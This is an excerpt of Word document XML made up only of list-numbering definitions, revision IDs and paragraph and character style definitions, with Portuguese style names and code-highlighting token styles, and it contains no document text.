    <w:tmpl w:val="40AEB54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2E787183"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D91A6506"/>
    <w:lvl w:ilvl="0">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="15" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="34D03D32"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D3EA4592"/>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6" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="375733B6"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="147AEE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D8C559A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="844271D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8" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="3DB86AEC"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4E045A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9" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="430E3516"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B4F2218A"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>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20" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="4F4959C4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="11BC9A3E"/>
    <w:lvl w:ilvl="0">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="21" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="51F7335E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D12C20AE"/>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2" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="590D1621"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="52F4B3E0"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>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59ADCABA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="59ADCA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5BBB51BF"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9D6A99EE"/>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5" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="5D0F41D2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9DDC9B96"/>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6" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="5E4F3759"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="22E653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04B7A44"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="CF8E277C"/>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8" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="63573D87"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="3306E2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B1C7241"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="CEC4DE3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30" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="705070F4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="3FB2DA2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1" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="75B9063C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9E6AF33C"/>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2" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="79DE1140"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="CD3AC0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AC77ECD"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C4C2FC6E"/>
    <w:lvl w:ilvl="0">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="*"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>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4" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="7F9E1781"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="ED66011A"/>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num w:numId="1" w16cid:durableId="81416544">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="462234713">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="345055931">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1802991444">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="332494887">
    <w:abstractNumId w:val="4"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1272280545">
    <w:abstractNumId w:val="4"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="908227613">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1257707535">
    <w:abstractNumId w:val="5"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="2"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="333385678">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="44960260">
    <w:abstractNumId w:val="13"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="3"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="1863975112">
    <w:abstractNumId w:val="4"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="2098744392">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="956057543">
    <w:abstractNumId w:val="4"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="142477545">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="1291786518">
    <w:abstractNumId w:val="33"/>
  </w:num>
  <w:num w:numId="16" w16cid:durableId="286592957">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="17" w16cid:durableId="79957931">
    <w:abstractNumId w:val="31"/>
  </w:num>
  <w:num w:numId="18" w16cid:durableId="1469275366">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="19" w16cid:durableId="941651028">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="20" w16cid:durableId="918174429">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="21" w16cid:durableId="129373391">
    <w:abstractNumId w:val="27"/>
  </w:num>
  <w:num w:numId="22" w16cid:durableId="531574910">
    <w:abstractNumId w:val="30"/>
  </w:num>
  <w:num w:numId="23" w16cid:durableId="1559970716">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="24" w16cid:durableId="1378355292">
    <w:abstractNumId w:val="34"/>
  </w:num>
  <w:num w:numId="25" w16cid:durableId="611982296">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="26" w16cid:durableId="2015952928">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="27" w16cid:durableId="1133985113">
    <w:abstractNumId w:val="29"/>
  </w:num>
  <w:num w:numId="28" w16cid:durableId="1882785089">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="29" w16cid:durableId="574171473">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="30" w16cid:durableId="243105527">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="31" w16cid:durableId="1161039744">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="32" w16cid:durableId="69818715">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="33" w16cid:durableId="2103456047">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="34" w16cid:durableId="118987572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7309197">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="36" w16cid:durableId="1419519436">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="37" w16cid:durableId="881483477">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="38" w16cid:durableId="24016481">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="39" w16cid:durableId="1970937390">
    <w:abstractNumId w:val="32"/>
  </w:num>
  <w:num w:numId="40" w16cid:durableId="645086851">
    <w:abstractNumId w:val="26"/>
  </w:num>
  <w:num w:numId="41" w16cid:durableId="16423458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3CC"/>
    <w:rsid w:val="000042D1"/>
    <w:rsid w:val="00224B0C"/>
    <w:rsid w:val="00236B3B"/>
    <w:rsid w:val="002B4126"/>
    <w:rsid w:val="002E26AA"/>
    <w:rsid w:val="00363733"/>
    <w:rsid w:val="00371B58"/>
    <w:rsid w:val="00392CCA"/>
    <w:rsid w:val="004253CC"/>
    <w:rsid w:val="005E74BB"/>
    <w:rsid w:val="00842992"/>
    <w:rsid w:val="00880EA6"/>
    <w:rsid w:val="00A04B3D"/>
    <w:rsid w:val="00AF6215"/>
    <w:rsid w:val="00CD0185"/>
    <w:rsid w:val="00FE74A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C72F"/>
  <w15:docId w15:val="{D1542B53-3E4C-423F-BBC6-4CC614F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PT" w:eastAsia="en-US" w:bidi="ar-SA"/>
      </w:rPr>
    </w:rPrDefault>
    <w:pPrDefault>
      <w:pPr>
        <w:autoSpaceDN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sz w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Ttulo1">
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="240" w:after="0"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Cambria" w:eastAsia="Times New Roman" w:hAnsi="Cambria"/>
      <w:color w:val="365F91"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="32"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Ttulo2">
    <w:name w:val="heading 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="9"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00392CCA"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="40" w:after="0"/>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri Light" w:eastAsia="Times New Roman" w:hAnsi="Calibri Light"/>
      <w:color w:val="2F5496"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="32"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Ttulo3">
    <w:name w:val="heading 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="9"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="40" w:after="0"/>
      <w:outlineLvl w:val="2"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri Light" w:eastAsia="Times New Roman" w:hAnsi="Calibri Light"/>
      <w:color w:val="1F3763"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Ttulo4">
    <w:name w:val="heading 4"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="9"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="40" w:after="0"/>
      <w:outlineLvl w:val="3"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri Light" w:eastAsia="Times New Roman" w:hAnsi="Calibri Light"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="2F549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
    <w:name w:val="Fonte parág. padrão"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Cabealho">
    <w:name w:val="header"/>
    <w:basedOn w:val="Normal"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4252"/>
        <w:tab w:val="right" w:pos="8504"/>
      </w:tabs>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CabealhoChar">
    <w:name w:val="Cabeçalho Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Rodap">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4252"/>
        <w:tab w:val="right" w:pos="8504"/>
      </w:tabs>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="RodapChar">
    <w:name w:val="Rodapé Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Ttulo1Char">
    <w:name w:val="Título 1 Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:rPr>
      <w:rFonts w:ascii="Cambria" w:eastAsia="Times New Roman" w:hAnsi="Cambria" w:cs="Times New Roman"/>
      <w:color w:val="365F91"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="32"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Hiperligao">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:uiPriority w:val="99"/>
    <w:rPr>
      <w:color w:val="0000FF"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="MenoPendente">
    <w:name w:val="Menção Pendente"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:rPr>
      <w:color w:val="605E5C"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E1DFDD"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="TtulodoLivro">
    <w:name w:val="Book Title"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:spacing w:val="5"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Subttulo">
    <w:name w:val="Subtitle"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="11"/>
    <w:qFormat/>
    <w:pPr>
      <w:spacing w:after="160"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:eastAsia="Times New Roman" w:hAnsi="Calibri"/>
      <w:color w:val="5A5A5A"/>
      <w:spacing w:val="15"/>
      <w:sz w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="SubttuloChar">
    <w:name w:val="Subtítulo Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:eastAsia="Times New Roman" w:hAnsi="Calibri" w:cs="Times New Roman"/>
      <w:color w:val="5A5A5A"/>
      <w:spacing w:val="15"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Ttulo4Char">
    <w:name w:val="Título 4 Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri Light" w:eastAsia="Times New Roman" w:hAnsi="Calibri Light" w:cs="Times New Roman"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="2F5496"/>
      <w:sz w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Ttulo2Char">
    <w:name w:val="Título 2 Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri Light" w:eastAsia="Times New Roman" w:hAnsi="Calibri Light" w:cs="Times New Roman"/>
      <w:color w:val="2F5496"/>
      <w:sz w:val="26"/>
      <w:szCs w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Ttulo3Char">
    <w:name w:val="Título 3 Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri Light" w:eastAsia="Times New Roman" w:hAnsi="Calibri Light" w:cs="Times New Roman"/>
      <w:color w:val="1F3763"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="VerbatimChar">
    <w:name w:val="Verbatim Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="KeywordTok">
    <w:name w:val="KeywordTok"/>
    <w:basedOn w:val="VerbatimChar"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:b/>
      <w:color w:val="007020"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="DataTypeTok">
    <w:name w:val="DataTypeTok"/>
    <w:basedOn w:val="VerbatimChar"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:color w:val="902000"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="FloatTok">
    <w:name w:val="FloatTok"/>
    <w:basedOn w:val="VerbatimChar"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:color w:val="40A070"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="StringTok">
    <w:name w:val="StringTok"/>
    <w:basedOn w:val="VerbatimChar"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:color w:val="4070A0"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CommentTok">
    <w:name w:val="CommentTok"/>
    <w:basedOn w:val="VerbatimChar"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:i/>
      <w:color w:val="60A0B0"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="FunctionTok">
    <w:name w:val="FunctionTok"/>
    <w:basedOn w:val="VerbatimChar"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:color w:val="06287E"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="VariableTok">
    <w:name w:val="VariableTok"/>
    <w:basedOn w:val="VerbatimChar"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:color w:val="19177C"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="OperatorTok">
    <w:name w:val="OperatorTok"/>
    <w:basedOn w:val="VerbatimChar"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:color w:val="666666"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="ExtensionTok">
    <w:name w:val="ExtensionTok"/>
    <w:basedOn w:val="VerbatimChar"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="AttributeTok">
    <w:name w:val="AttributeTok"/>
    <w:basedOn w:val="VerbatimChar"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:color w:val="7D9029"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="NormalTok">
    <w:name w:val="NormalTok"/>
    <w:basedOn w:val="VerbatimChar"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Corpodetexto">
    <w:name w:val="Body Text"/>
    <w:basedOn w:val="Normal"/>
    <w:pPr>
      <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CorpodetextoChar">
    <w:name w:val="Corpo de texto Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Times New Roman"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="en-US"/>
    </w:r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customStyle="1" w:styleId="SourceCode">
    <w:name w:val="Source Code"/>
    <w:basedOn w:val="Normal"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:sz w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="InlineCode">
    <w:name w:val="InlineCode"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:color w:val="C7254E"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Citao">
    <w:name w:val="Quote"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:pPr>
      <w:suppressAutoHyphens w:val="0"/>
      <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="000000"/>
      <w:sz w:val="22"/>
      <w:lang w:val="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CitaoChar">
    <w:name w:val="Citação Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:rPr>
      <w:rFonts w:cs="Calibri"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="000000"/>
      <w:lang w:val="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Quote1">
    <w:name w:val="Quote1"/>
    <w:basedOn w:val="Normal"/>
    <w:pPr>
      <w:suppressAutoHyphens w:val="0"/>
      <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:sz w:val="20"/>
